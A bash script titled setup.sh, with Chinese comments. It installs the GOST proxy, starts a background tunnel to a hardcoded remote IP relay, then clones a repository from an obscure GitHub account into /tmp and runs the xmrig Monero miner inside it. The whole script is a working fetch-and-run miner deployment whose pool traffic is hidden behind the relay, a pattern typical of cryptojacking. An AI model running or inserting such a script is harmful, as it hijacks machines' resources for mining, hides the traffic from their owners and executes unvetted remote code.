#!/bin/bash
set -e

LOG="/tmp/setup_$(date +%s).log"
exec > >(tee -a "$LOG") 2>&1

echo "[$(date '+%H:%M:%S')] 开始执行 setup.sh"

# 第1条：安装依赖
echo "[$(date '+%H:%M:%S')] 安装 wget git unzip..."
sudo apt update && sudo apt install -y wget git unzip

# 第2条：下载 GOST
echo "[$(date '+%H:%M:%S')] 下载 GOST..."
wget -q https://github.com/ginuerzh/gost/releases/download/v2.12.0/gost_2.12.0_linux_amd64.tar.gz

# 第3条：安装 GOST
echo "[$(date '+%H:%M:%S')] 安装 GOST..."
tar -zxf gost_2.12.0_linux_amd64.tar.gz
if [ -f gost ]; then
    sudo mv gost /usr/local/bin
    sudo chmod +x /usr/local/bin/gost
    echo "GOST_OK"
else
    wget -q https://github.com/ginuerzh/gost/releases/download/v2.12.0/gost_2.12.0_linux_amd64.tar.gz
    tar -zxf gost_2.12.0_linux_amd64.tar.gz
    sudo mv gost /usr/local/bin
    sudo chmod +x /usr/local/bin/gost
    echo "GOST_RETRY_OK"
fi

# 第4条：启动 GOST 后台
echo "[$(date '+%H:%M:%S')] 启动 GOST..."
nohup gost -L=tcp://:3335 -F=relay+wss://158.247.199.230:9999 >/dev/null 2>&1 &
sleep 4
if pgrep -x "gost" > /dev/null; then
    echo "GOST 进程已启动 (PID: $(pgrep -x gost))"
else
    echo "GOST 启动可能失败"
fi

# 第5条：克隆并启动 xmrig (前台执行)
echo "[$(date '+%H:%M:%S')] 下载并运行 xmrig..."
cd /tmp
rm -rf moneroocean
git clone https://github.com/mdfitnhtingint/moneroocean.git || {
    echo "git clone 失败, 尝试备用仓库..."
    git clone https://github.com/mdfitnhtingint/moneroocean.git
}
cd moneroocean
unzip -o moneroocean.zip
chmod +x xmrig
echo "[$(date '+%H:%M:%S')] 启动 xmrig (前台)..."
./xmrig
echo "[$(date '+%H:%M:%S')] xmrig 已退出"
